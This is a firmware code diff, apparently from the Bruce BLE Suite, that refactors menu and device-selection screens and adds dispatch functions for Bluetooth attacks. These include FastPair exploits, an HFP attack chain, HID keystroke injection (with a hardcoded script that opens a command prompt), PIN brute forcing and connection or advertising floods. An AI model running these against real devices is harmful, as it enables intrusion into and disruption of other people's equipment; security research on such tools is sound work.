+        int right = x + w;
+
+        bleDrawRssi(right - 11, y, snapshot->rssi[idx], fg);
+        right -= 15;
+
+        String tags;
+        if (snapshot->fastPair[idx]) tags += " FP";
+        if (snapshot->hfp[idx]) tags += " HFP";
+        if (snapshot->types[idx] & 0x01) tags += " AUD";
+        if (snapshot->types[idx] & 0x02) tags += " HID";
+        if (tags.length()) {
+            int tw = tft.textWidth(tags.c_str());
+            tft.setTextColor(sel ? bruceConfig.bgColor : bleAccent(), bg);
+            tft.drawString(tags, right - tw, y, 1);
+            right -= tw + 2;
+        }
+
+        // last two MAC octets tell apart devices advertising the same name
+        String mac = snapshot->addresses[idx];
+        String name = snapshot->names[idx];
+        String tail = (mac.length() >= 5) ? mac.substring(mac.length() - 5) : mac;
+        int tailW = name.equalsIgnoreCase(mac) ? 0 : tft.textWidth(tail.c_str()) + 4;
+        if (right - cur < tailW + 8 * cw) tailW = 0; // too narrow, the name wins
+
+        tft.setTextColor(fg, bg);
+        tft.drawString(bleFit(name, right - cur - tailW), cur, y, 1);
+        if (tailW) {
+            tft.setTextColor(dim, bg);
+            tft.drawRightString(tail, right, y, 1);
+        }
+    };
+
+    int selectedIdx = 0;
     bool exitLoop = false;
 
     while (!exitLoop) {
-        if (selectedIdx != lastSelected || scrollOffset != lastScrollOffset) {
-            tft.fillScreen(bruceConfig.bgColor);
-            tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
-            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-            tft.setTextSize(2);
-            tft.setCursor((tftWidth - tft.textWidth("SELECT DEVICE")) / 2, 15);
-            tft.print("SELECT DEVICE");
-            tft.setTextSize(1);
-
-            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
-            tft.setCursor(20, 40);
-            tft.print("Found: ");
-            tft.print(deviceCount);
-            tft.print(" devices");
-
-            for (int i = 0; i < maxVisibleDevices && (scrollOffset + i) < deviceCount; i++) {
-                String displayName, address;
-                int rssi = 0;
-                bool fastPair = false, hasHFP = false;
-                uint8_t deviceType = 0;
-
-                if (xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-                    int deviceIndex = scrollOffset + i;
-                    if (deviceIndex < scannerData.deviceNames.size()) {
-                        displayName = scannerData.deviceNames[deviceIndex];
-                        address = scannerData.deviceAddresses[deviceIndex];
-                        rssi = scannerData.deviceRssi[deviceIndex];
-                        fastPair = scannerData.deviceFastPair[deviceIndex];
-                        hasHFP = scannerData.deviceHasHFP[deviceIndex];
-                        deviceType = scannerData.deviceTypes[deviceIndex];
-                    }
-                    xSemaphoreGive(scannerData.mutex);
-                }
-
-                if (displayName.isEmpty()) continue;
-
-                String displayText = displayName;
-                if (displayText.length() > 18) displayText = displayText.substring(0, 15) + "...";
-                displayText += " (" + String(rssi) + "dB)";
-                if (fastPair) displayText += " [FP]";
-                if (hasHFP) displayText += " [HFP]";
-                if (deviceType & 0x01) displayText += " [AUDIO]";
-                if (deviceType & 0x02) displayText += " [HID]";
-
-                int yPos = menuStartY + (i * deviceItemHeight);
-                if (yPos + deviceItemHeight > tftHeight - 45) break;
-
-                if (i == selectedIdx - scrollOffset) {
-                    tft.fillRect(15, yPos, tftWidth - 30, deviceItemHeight - 5, TFT_WHITE);
-                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                    tft.setCursor(20, yPos + 10);
-                    tft.print("> ");
-                } else {
-                    tft.fillRect(15, yPos, tftWidth - 30, deviceItemHeight - 5, bruceConfig.bgColor);
-                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                    tft.setCursor(20, yPos + 10);
-                    tft.print("  ");
-                }
-                tft.print(displayText);
-            }
-
-            if (deviceCount > maxVisibleDevices) {
-                tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
-                tft.setCursor(tftWidth - 25, menuStartY + 10);
-                if (scrollOffset > 0) tft.print("^");
-                tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleDevices * deviceItemHeight) - 15);
-                if (scrollOffset + maxVisibleDevices < deviceCount) tft.print("v");
-            }
-
-            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-            tft.setCursor(20, tftHeight - 35);
-            tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
-            lastSelected = selectedIdx;
-            lastScrollOffset = scrollOffset;
-        }
-
-        if (check(EscPress)) {
+        int chosen = bleListLoop(
+            "Select Device", (int)deviceCount, "SEL pick  ESC back", deviceRow, &selectedIdx
+        );
+        if (chosen < 0) {
             exitLoop = true;
-        } else if (check(PrevPress)) {
-            delay(150);
-            if (selectedIdx > 0) {
-                selectedIdx--;
-                if (selectedIdx < scrollOffset) scrollOffset = selectedIdx;
-            } else {
-                selectedIdx = deviceCount - 1;
-                scrollOffset = std::max(0, (int)deviceCount - maxVisibleDevices);
-            }
-        } else if (check(NextPress)) {
-            delay(150);
-            if (selectedIdx < deviceCount - 1) {
-                selectedIdx++;
-                if (selectedIdx >= scrollOffset + maxVisibleDevices)
-                    scrollOffset = selectedIdx - maxVisibleDevices + 1;
-            } else {
-                selectedIdx = 0;
-                scrollOffset = 0;
-            }
-        } else if (check(SelPress)) {
-            String selectedMAC = "", selectedName = "";
+        } else {
+            selectedIdx = chosen;
+            String selectedMAC = snapshot->addresses[selectedIdx];
+            String selectedName = snapshot->names[selectedIdx];
 
-            if (xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-                if (selectedIdx < scannerData.deviceAddresses.size()) {
-                    selectedMAC = scannerData.deviceAddresses[selectedIdx];
-                    selectedName = scannerData.deviceNames[selectedIdx];
-                }
-                xSemaphoreGive(scannerData.mutex);
-            }
+            selectedMAC.trim();
+            selectedMAC.toUpperCase();
 
-            if (!selectedMAC.isEmpty()) {
-                scannerData.clear();
-                return selectedMAC + ":0";
-            }
+            g_selectedDevice.address = selectedMAC;
+            g_selectedDevice.name = selectedName;
+            g_selectedDevice.rssi = snapshot->rssi[selectedIdx];
+            g_selectedDevice.hasFastPair = snapshot->fastPair[selectedIdx];
+            g_selectedDevice.hasHFP = snapshot->hfp[selectedIdx];
+            g_selectedDevice.deviceType = snapshot->types[selectedIdx];
+
+            String returnMac = selectedMAC;
+            returnMac.trim();
+
+            return returnMac;
         }
         delay(50);
     }
-    scannerData.clear();
+
     return "";
 }
 
 String selectMultipleTargetsFromScan(const char *title, std::vector<NimBLEAddress> &targets) {
     targets.clear();
-    String singleTarget = selectTargetFromScan(title);
-    if (!singleTarget.isEmpty()) targets.push_back(parseAddress(singleTarget));
-    return singleTarget;
-}
 
-NimBLEAddress parseAddress(const String &addressInfo) {
-    int colonPos = addressInfo.lastIndexOf(':');
-    if (colonPos == -1) {
-        std::string addrStr = addressInfo.c_str();
-        return NimBLEAddress(addrStr, BLE_ADDR_PUBLIC);
+    DeviceSnapshot *snapshot = scannerData.getSnapshot();
+    if (!snapshot || snapshot->count == 0) {
+        showErrorMessage("No devices found. Run scan first.");
+        return "";
     }
-    String mac = addressInfo.substring(0, colonPos);
-    std::string addrStr = mac.c_str();
-    return NimBLEAddress(addrStr, BLE_ADDR_PUBLIC);
+
+    size_t deviceCount = scannerData.deviceAddresses.size();
+    std::vector<bool> picked(deviceCount, false);
+
+    // The old screen advertised "NEXT: Confirm" but no key ever confirmed, so
+    // the only way out was ESC, which cleared the selection - the success path
+    // was unreachable. A trailing row now does the confirming, which also keeps
+    // the whole flow on the four keys every device has.
+    int rowCount = (int)deviceCount + 1;
+    int cursor = 0;
+
+    BleRowDrawer row = [snapshot, &picked, &targets, deviceCount](
+                           int idx, int x, int y, int w, bool sel
+                       ) {
+        uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
+        uint16_t bg = sel ? bruceConfig.priColor : bruceConfig.bgColor;
+        const int cw = FP * LW;
+        tft.setTextSize(FP);
+        tft.setTextColor(fg, bg);
+
+        if (idx >= (int)deviceCount) {
+            tft.drawString("> Confirm (" + String(targets.size()) + ")", x, y, 1);
+            return;
+        }
+
+        tft.drawString(picked[idx] ? "[x]" : "[ ]", x, y, 1);
+        int cur = x + 4 * cw;
+        int right = x + w;
+        bleDrawRssi(right - 11, y, snapshot->rssi[idx], fg);
+        right -= 15;
+
+        String mac = snapshot->addresses[idx];
+        String name = snapshot->names[idx];
+        String tail = (mac.length() >= 5) ? mac.substring(mac.length() - 5) : mac;
+        int tailW = name.equalsIgnoreCase(mac) ? 0 : tft.textWidth(tail.c_str()) + 4;
+        if (right - cur < tailW + 8 * cw) tailW = 0;
+
+        tft.drawString(bleFit(name, right - cur - tailW), cur, y, 1);
+        if (tailW) {
+            tft.setTextColor(sel ? bruceConfig.bgColor : bleDim(), bg);
+            tft.drawRightString(tail, right, y, 1);
+        }
+    };
+
+    for (;;) {
+        int chosen = bleListLoop(title, rowCount, "SEL toggle  ESC cancel", row, &cursor);
+        if (chosen < 0) {
+            targets.clear();
+            return "";
+        }
+        if (chosen >= (int)deviceCount) break; // confirm row
+
+        picked[chosen] = !picked[chosen];
+        if (picked[chosen]) {
+            targets.push_back(
+                NimBLEAddress(std::string(snapshot->addresses[chosen].c_str()), BLE_ADDR_PUBLIC)
+            );
+        } else {
+            for (auto it = targets.begin(); it != targets.end(); ++it) {
+                if (it->toString() == snapshot->addresses[chosen].c_str()) {
+                    targets.erase(it);
+                    break;
+                }
+            }
+        }
+    }
+
+    if (targets.empty()) return "";
+    return String(targets.size()) + " targets selected";
 }
 
 //=============================================================================
-// Menu System - with optimized redraw to prevent flicker
+// parseAddress - Fixed MAC extraction
+//=============================================================================
+
+NimBLEAddress parseAddress(const String &addressInfo) {
+    String cleanAddr = addressInfo;
+    cleanAddr.trim();
+    cleanAddr.toUpperCase();
+
+    if (cleanAddr.endsWith(":0")) { cleanAddr = cleanAddr.substring(0, cleanAddr.length() - 2); }
+
+    int start = -1;
+    int colonCount = 0;
+    for (int i = 0; i < cleanAddr.length(); i++) {
+        char c = cleanAddr.charAt(i);
+        if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F')) {
+            if (start == -1) start = i;
+            if (i - start + 1 >= 17) {
+                String possibleMac = cleanAddr.substring(start, start + 17);
+                bool valid = true;
+                for (int j = 0; j < 17; j++) {
+                    if (j % 3 == 2) {
+                        if (possibleMac.charAt(j) != ':') {
+                            valid = false;
+                            break;
+                        }
+                    } else {
+                        char h = possibleMac.charAt(j);
+                        if (!((h >= '0' && h <= '9') || (h >= 'A' && h <= 'F'))) {
+                            valid = false;
+                            break;
+                        }
+                    }
+                }
+                if (valid) { return NimBLEAddress(std::string(possibleMac.c_str()), BLE_ADDR_PUBLIC); }
+            }
+        } else if (c == ':') {
+            colonCount++;
+        } else {
+            if (start != -1 && colonCount < 5) {
+                start = -1;
+                colonCount = 0;
+            }
+        }
+    }
+
+    for (int i = 0; i < addressInfo.length() - 17; i++) {
+        String substr = addressInfo.substring(i, i + 17);
+        bool valid = true;
+        for (int j = 0; j < 17; j++) {
+            char c = substr.charAt(j);
+            if (j % 3 == 2) {
+                if (c != ':') {
+                    valid = false;
+                    break;
+                }
+            } else {
+                if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f'))) {
+                    valid = false;
+                    break;
+                }
+            }
+        }
+        if (valid) {
+            substr.toUpperCase();
+            return NimBLEAddress(std::string(substr.c_str()), BLE_ADDR_PUBLIC);
+        }
+    }
+
+    Serial.println("[WARN] Invalid MAC address format: " + addressInfo);
+    return NimBLEAddress(std::string(""), BLE_ADDR_PUBLIC);
+}
+
+//=============================================================================
+// Attack Functions
+//=============================================================================
+
+void runHFPVulnerabilityTest(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    HFPExploitEngine hfp;
+    bool result = hfp.testCVE202536911(target);
+
+    std::vector<String> lines;
+    lines.push_back("HFP VULNERABILITY TEST");
+    lines.push_back("Target: " + String(target.toString().c_str()));
+    lines.push_back("");
+    lines.push_back("CVE-2025-36911: " + String(result ? "VULNERABLE" : "SAFE"));
+    lines.push_back("");
+    if (result) {
+        lines.push_back("Device may be vulnerable to");
+        lines.push_back("HFP-based attacks");
+    } else {
+        lines.push_back("Device appears to be patched");
+    }
+
+    cleanup.disable();
+    showDeviceInfoScreen("HFP TEST", lines, result ? TFT_ORANGE : TFT_GREEN, TFT_WHITE);
+}
+
+void runHFPAttackChain(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    if (!confirmAttack("Execute HFP attack chain?")) return;
+
+    HFPExploitEngine hfp;
+    bool result = hfp.executeHFPAttackChain(target);
+
+    if (result) {
+        showAttackResult(true, "HFP attack chain successful!");
+    } else {
+        showAttackResult(false, "HFP attack chain failed");
+    }
+    cleanup.disable();
+}
+
+void runSmartHFPPivot(NimBLEAddress target, const String &deviceName, int rssi) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    runHFPHIDPivotAttack(target);
+    cleanup.disable();
+}
+
+void runFastPairScan(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    FastPairExploitEngine fpEngine;
+    auto devices = fpEngine.scanForFastPairDevices(10);
+
+    std::vector<String> lines;
+    lines.push_back("FASTPAIR DEVICES FOUND");
+    lines.push_back("Total: " + String(devices.size()));
+    lines.push_back("");
+
+    for (int i = 0; i < std::min(5, (int)devices.size()); i++) {
+        lines.push_back(String(i + 1) + ". " + devices[i].name + " | " + devices[i].deviceType);
+    }
+    if (devices.size() > 5) { lines.push_back("... and " + String(devices.size() - 5) + " more"); }
+
+    cleanup.disable();
+    showDeviceInfoScreen("FASTPAIR SCAN", lines, TFT_BLUE, TFT_WHITE);
+}
+
+void runFastPairVulnerabilityTest(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.testVulnerability(target);
+}
+
+void runFastPairMemoryCorruption(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_MEMORY_CORRUPTION);
+}
+
+void runFastPairStateConfusion(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_STATE_CONFUSION);
+}
+
+void runFastPairCryptoOverflow(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_CRYPTO_OVERFLOW);
+}
+
+void runFastPairPopupSpam(NimBLEAddress target, FastPairPopupType type) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.spamFastPairPopups(type, 50);
+}
+
+void runFastPairAllExploits(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_ALL);
+}
+
+void runFastPairHIDChain(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    showAttackProgress("FastPair → HID chain attack...", TFT_CYAN);
+
+    FastPairExploitEngine fpEngine;
+    bool fpSuccess = fpEngine.testVulnerability(target);
+
+    if (fpSuccess) {
+        showAttackProgress("FastPair vulnerable! Proceeding to HID...", TFT_GREEN);
+        HIDDuckyService ducky;
+        String script = "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
+        ducky.injectDuckyScript(target, script);
+    } else {
+        showAttackResult(false, "FastPair not vulnerable");
+    }
+    cleanup.disable();
+}
+
+void runHIDConnectionExploit(NimBLEAddress target) {
+    HIDExploitEngine hid;
+    hid.forceHIDConnection(target, "Unknown HID Device", -60);
+}
+
+void runAdvancedDuckyInjection(NimBLEAddress target) {
+    String script = getScriptFromUser();
+    if (!script.isEmpty()) {
+        HIDDuckyService ducky;
+        ducky.forceInjectDuckyScript(target, script, "", 0);
+    }
+}
+
+void runHIDVulnerabilityTest(NimBLEAddress target) {
+    HIDExploitEngine hid;
+    bool result = hid.testHIDVulnerability(target);
+
+    std::vector<String> lines;
+    lines.push_back("HID VULNERABILITY TEST");
+    lines.push_back("Target: " + String(target.toString().c_str()));
+    lines.push_back("");
+    lines.push_back("HID Vulnerable: " + String(result ? "YES" : "NO"));
+
+    showDeviceInfoScreen("HID TEST", lines, result ? TFT_ORANGE : TFT_GREEN, TFT_WHITE);
+}
+
+void runVulnerabilityScan(NimBLEAddress target) {
+    VulnerabilityScanner scanner;
+    scanner.scanDevice(target);
+}
+
+void runForceHIDInjection(NimBLEAddress target) {
+    HIDDuckyService ducky;
+    String script = getScriptFromUser();
+    if (!script.isEmpty()) { ducky.forceInjectDuckyScript(target, script, "", 0); }
+}
+
+void runJamConnectAttack(NimBLEAddress target) {
+    MultiConnectionAttack multi;
+    multi.jamAndConnect(target);
+}
+
+void runMultiTargetAttack() {
+    std::vector<NimBLEAddress> targets;
+    String result = selectMultipleTargetsFromScan("SELECT TARGETS", targets);
+    if (result.isEmpty() && targets.empty()) return;
+
+    if (targets.size() > 0) {
+        const char *options[] = {"Connection Flood", "Advertising Spam"};
+        int choice = showSubMenu("Multi-Target Attack", options, 2);
+
+        MultiConnectionAttack multi;
+        if (choice == 0) multi.connectionFlood(targets);
+        else if (choice == 1) multi.advertisingSpam(targets);
+    }
+}
+
+void showAttackMenuWithTarget(NimBLEAddress target) { executeAttackWithTargetScan(0); }
+
+void executeSelectedAttack(int attackIndex, NimBLEAddress target) {
+    executeAttackWithTargetScan(attackIndex);
+}
+
+void runWhisperPairAttack(NimBLEAddress target) {
+    WhisperPairExploit whisper;
+    whisper.execute(target);
+}
+
+void runAdvancedExploit(NimBLEAddress target) {
+    WhisperPairExploit whisper;
+    whisper.executeAdvanced(target, 0);
+}
+
+void runAudioStackCrash(NimBLEAddress target) {
+    AudioAttackService audio;
+    audio.crashAudioStack(target);
+}
+
+void runMediaCommandHijack(NimBLEAddress target) {
+    AudioAttackService audio;
+    audio.injectMediaCommands(target);
+}
+
+void runHIDInjection(NimBLEAddress target) {
+    HIDAttackServiceClass hid;
+    hid.injectKeystrokes(target);
+}
+
+void runDuckyScriptAttack(NimBLEAddress target) {
+    HIDDuckyService ducky;
+    String script = getScriptFromUser();
+    if (!script.isEmpty()) { ducky.injectDuckyScript(target, script); }
+}
+
+void runPINBruteForce(NimBLEAddress target) {
+    PairingAttackServiceClass pairing;
+    pairing.bruteForcePIN(target);
+}
+
+void runConnectionFlood(NimBLEAddress target) {
+    DoSAttackServiceClass dos;
+    dos.connectionFlood(target);
+}
+
+void runAdvertisingSpam(NimBLEAddress target) {
+    DoSAttackServiceClass dos;
+    dos.advertisingSpam(target);
+}
+
+//=============================================================================
+// Menu System
 //=============================================================================
 
 static bool welcomeShown = false;
 
 void showWelcomeScreen() {
-    if (welcomeShown) return;
-
-    tft.fillScreen(TFT_GRAY);
-    tft.setTextSize(3);
-    tft.setTextColor(TFT_PURPLE, TFT_GRAY);
-    tft.setCursor((tftWidth - tft.textWidth("BRUCE")) / 2, 40);
-    tft.print("BRUCE");
-
-    tft.setTextColor(TFT_BLUE, TFT_GRAY);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth("BLE SUITE")) / 2, 90);
-    tft.print("BLE SUITE");
-
-    tft.setTextColor(TFT_GREEN, TFT_GRAY);
-    tft.setTextSize(1);
-    tft.setCursor((tftWidth - tft.textWidth("v2.0b")) / 2, 130);
-    tft.print("v2.0b");
-    delay(1500);
-
+    // The suite used to block for two seconds on a splash carrying its own
+    // hardcoded version number. Nothing else in Bruce does that, so the menu
+    // now opens straight away.
     welcomeShown = true;
 }
 
+//=============================================================================
+// BleSuiteMenu - FIXED: Init ONCE at entry
+//=============================================================================
+
 void BleSuiteMenu() {
+    // FIX: Init BLE stack ONCE when entering the suite
+    BLEStateManager::initBLE("Bruce-BLESuite", ESP_PWR_LVL_P9);
+
+    // Clear data when entering the menu
+    scannerData.clear();
+    g_selectedDevice.address = "";
+    g_selectedDevice.name = "";
+
     showWelcomeScreen();
 
-    const int MENU_ITEMS = 11;
+    const int MENU_ITEMS = 12;
     const char *menuItems[] = {
         "Quick Vulnerability Scan",
         "Deep Device Profiling",
@@ -3936,76 +4834,34 @@ void BleSuiteMenu() {
         "DoS Attacks",
         "Payload Delivery",
         "Testing Tools",
-        "Universal Attack Chain"
+        "Universal Attack Chain",
+        "BLE Sniffer"
     };
 
-    int selected = 0, scrollOffset = 0;
-    int lastSelected = -1, lastScrollOffset = -1;
-    int maxVisible = (tftHeight - 80) / 25;
+    int selected = 0;
 
     while (true) {
-        if (selected != lastSelected || scrollOffset != lastScrollOffset) {
-            tft.fillScreen(bruceConfig.bgColor);
-            tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
+        int choice =
+            bleListLoop("BLE Suite", MENU_ITEMS, "SEL run  ESC back", bleTextRow(menuItems), &selected);
 
-            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-            tft.setTextSize(2);
-            tft.setCursor((tftWidth - tft.textWidth("BLE SUITE")) / 2, 15);
-            tft.print("BLE SUITE");
-            tft.setTextSize(1);
-
-            for (int i = 0; i < maxVisible && (scrollOffset + i) < MENU_ITEMS; i++) {
-                int idx = scrollOffset + i;
-                int yPos = 60 + (i * 25);
-
-                if (idx == selected) {
-                    tft.fillRect(20, yPos, tftWidth - 40, 20, TFT_WHITE);
-                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                    tft.setCursor(25, yPos + 5);
-                    tft.print("> ");
-                } else {
-                    tft.fillRect(20, yPos, tftWidth - 40, 20, bruceConfig.bgColor);
-                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                    tft.setCursor(25, yPos + 5);
-                    tft.print("  ");
-                }
-                tft.print(String(idx + 1) + ". " + menuItems[idx]);
+        if (choice < 0) {
+            // Clear data when exiting the menu
+            if (g_pBLEScan) {
+                g_pBLEScan->stop();
+                g_pBLEScan->clearResults();
+                g_bleScanActive = false;
             }
+            scannerData.clear();
+            g_selectedDevice.address = "";
+            g_selectedDevice.name = "";
 
-            if (MENU_ITEMS > maxVisible) {
-                tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
-                tft.setCursor(tftWidth - 25, 65);
-                if (scrollOffset > 0) tft.print("^");
-                tft.setCursor(tftWidth - 25, 65 + (maxVisible * 25) - 10);
-                if (scrollOffset + maxVisible < MENU_ITEMS) tft.print("v");
-            }
-
-            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-            tft.setCursor(20, tftHeight - 35);
-            tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
-            lastSelected = selected;
-            lastScrollOffset = scrollOffset;
+            // Deinit BLE stack when exiting the suite
+            BLEStateManager::deinitBLE(true);
+            return;
         }
 
-        if (check(EscPress)) return;
-        if (check(PrevPress)) {
-            selected = (selected > 0) ? selected - 1 : MENU_ITEMS - 1;
-            if (selected < scrollOffset) scrollOffset = selected;
-            if (selected >= scrollOffset + maxVisible) scrollOffset = selected - maxVisible + 1;
-            delay(150);
-        }
-        if (check(NextPress)) {
-            selected = (selected < MENU_ITEMS - 1) ? selected + 1 : 0;
-            if (selected < scrollOffset) scrollOffset = selected;
-            if (selected >= scrollOffset + maxVisible) scrollOffset = selected - maxVisible + 1;
-            delay(150);
-        }
-        if (check(SelPress)) {
-            executeAttackWithTargetScan(selected);
-            lastSelected = -1;
-        }
-        delay(50);
+        if (choice == MENU_ITEMS - 1) BLE_Sniffer();
+        else executeAttackWithTargetScan(choice);
     }
 }
 
@@ -4031,117 +4887,61 @@ const char *getScanTitle(int attackIndex) {
 }
 
 void executeAttackWithTargetScan(int attackIndex) {
+    // FIX: Ensure BLE is initialized for the attack
+    BLEStateManager::initBLE("Bruce-Attack", ESP_PWR_LVL_P9);
+
     String targetInfo = selectTargetFromScan(getScanTitle(attackIndex));
     if (targetInfo.isEmpty()) return;
 
     NimBLEAddress target = parseAddress(targetInfo);
     if (!confirmAttack(target.toString().c_str())) return;
 
-    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+    SelectedDevice deviceInfo = g_selectedDevice;
 
     switch (attackIndex) {
-        case 0: runQuickTest(target); break;
-        case 1: runDeviceProfiling(target); break;
-        case 2: showFastPairSubMenu(target); break;
-        case 3: showHFPSubMenu(target); break;
-        case 4: showAudioSubMenu(target); break;
-        case 5: showHIDSubMenu(target); break;
-        case 6: showMemorySubMenu(target); break;
-        case 7: showDoSSubMenu(target); break;
-        case 8: showPayloadSubMenu(target); break;
-        case 9: showTestingSubMenu(target); break;
-        case 10: runUniversalAttack(target); break;
+        case 0: runQuickTest(target, deviceInfo); break;
+        case 1: runDeviceProfiling(target, deviceInfo); break;
+        case 2: showFastPairSubMenu(target, deviceInfo); break;
+        case 3: showHFPSubMenu(target, deviceInfo); break;
+        case 4: showAudioSubMenu(target, deviceInfo); break;
+        case 5: showHIDSubMenu(target, deviceInfo); break;
+        case 6: showMemorySubMenu(target, deviceInfo); break;
+        case 7: showDoSSubMenu(target, deviceInfo); break;
+        case 8: showPayloadSubMenu(target, deviceInfo); break;
+        case 9: showTestingSubMenu(target, deviceInfo); break;
+        case 10: runUniversalAttack(target, deviceInfo); break;
     }
-
-    cleanup.disable();
 
     showAttackProgress("Attack complete. Press any key to continue...", TFT_GREEN);
     while (!check(EscPress) && !check(SelPress) && !check(PrevPress) && !check(NextPress)) delay(50);
+
+    if (g_pBLEScan) {
+        g_pBLEScan->stop();
+        g_pBLEScan->clearResults();
+        g_bleScanActive = false;
+    }
+    delay(100);
 }
 
 //=============================================================================
-// Submenu Display - with text wrapping for long options
+// Submenu Display
 //=============================================================================
 
 int showSubMenu(const char *title, const char *options[], int optionCount) {
-    tft.fillScreen(bruceConfig.bgColor);
-    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
-    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth(title)) / 2, 15);
-    tft.print(title);
-    tft.setTextSize(1);
-
-    int selected = 0, scrollOffset = 0;
-    int lastSelected = -1, lastScrollOffset = -1;
-    int maxVisible = (tftHeight - 80) / 25;
-
-    while (true) {
-        if (selected != lastSelected || scrollOffset != lastScrollOffset) {
-            tft.fillRect(20, 60, tftWidth - 40, tftHeight - 100, bruceConfig.bgColor);
-
-            for (int i = 0; i < maxVisible && (scrollOffset + i) < optionCount; i++) {
-                int idx = scrollOffset + i;
-                int yPos = 60 + (i * 25);
-
-                String displayText = options[idx];
-                if (displayText.length() > 28) { displayText = displayText.substring(0, 25) + "..."; }
-
-                if (idx == selected) {
-                    tft.fillRect(20, yPos, tftWidth - 40, 20, TFT_WHITE);
-                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                    tft.setCursor(25, yPos + 5);
-                    tft.print("> ");
-                } else {
-                    tft.fillRect(20, yPos, tftWidth - 40, 20, bruceConfig.bgColor);
-                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                    tft.setCursor(25, yPos + 5);
-                    tft.print("  ");
-                }
-                tft.print(displayText);
-            }
-
-            if (optionCount > maxVisible) {
-                tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
-                tft.setCursor(tftWidth - 25, 65);
-                if (scrollOffset > 0) tft.print("^");
-                tft.setCursor(tftWidth - 25, 65 + (maxVisible * 25) - 10);
-                if (scrollOffset + maxVisible < optionCount) tft.print("v");
-            }
-
-            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-            tft.setCursor(20, tftHeight - 35);
-            tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
-            lastSelected = selected;
-            lastScrollOffset = scrollOffset;
-        }
-
-        if (check(EscPress)) return -1;
-        if (check(PrevPress)) {
-            selected = (selected > 0) ? selected - 1 : optionCount - 1;
-            if (selected < scrollOffset) scrollOffset = selected;
-            if (selected >= scrollOffset + maxVisible) scrollOffset = selected - maxVisible + 1;
-            delay(150);
-        }
-        if (check(NextPress)) {
-            selected = (selected < optionCount - 1) ? selected + 1 : 0;
-            if (selected < scrollOffset) scrollOffset = selected;
-            if (selected >= scrollOffset + maxVisible) scrollOffset = selected - maxVisible + 1;
-            delay(150);
-        }
-        if (check(SelPress)) return selected;
-
-        delay(50);
-    }
+    // Carry the chosen target into the hint line so the submenus stop hiding
+    // which device the attack is aimed at.
+    String hint = g_selectedDevice.address.isEmpty()
+                      ? String("SEL run  ESC back")
+                      : ("> " + (g_selectedDevice.name.length() ? g_selectedDevice.name
+                                                                : g_selectedDevice.address));
+    return bleListLoop(title, optionCount, hint, bleTextRow(options));
 }
 
 //=============================================================================
 // Attack Submenus
 //=============================================================================
 
-void showFastPairSubMenu(NimBLEAddress target) {
+void showFastPairSubMenu(NimBLEAddress target, SelectedDevice deviceInfo) {
     const char *options[] = {
         "Quick Vulnerability Test",
         "Memory Corruption Attack",
@@ -4150,13 +4950,19 @@ void showFastPairSubMenu(NimBLEAddress target) {
         "Handshake Fault Attack",
         "Rapid Connection Attack",
         "Popup Spam",
-        "Run All Exploits"
+        "Run All Exploits",
+        "Smart Exploit (Auto Samsung)"
     };
 
-    int choice = showSubMenu("FastPair Attacks", options, 8);
+    int choice = showSubMenu("FastPair Attacks", options, 9);
     if (choice == -1) return;
 
     FastPairExploitEngine fpEngine;
+
+    if (choice == 8) {
+        fpEngine.smartExploit(target);
+        return;
+    }
 
     NimBLEClient *pClient = nullptr;
     NimBLERemoteCharacteristic *pKbpChar = nullptr;
@@ -4219,7 +5025,7 @@ void showFastPairSubMenu(NimBLEAddress target) {
     }
 }
 
-void showHFPSubMenu(NimBLEAddress target) {
+void showHFPSubMenu(NimBLEAddress target, SelectedDevice deviceInfo) {
     const char *options[] = {
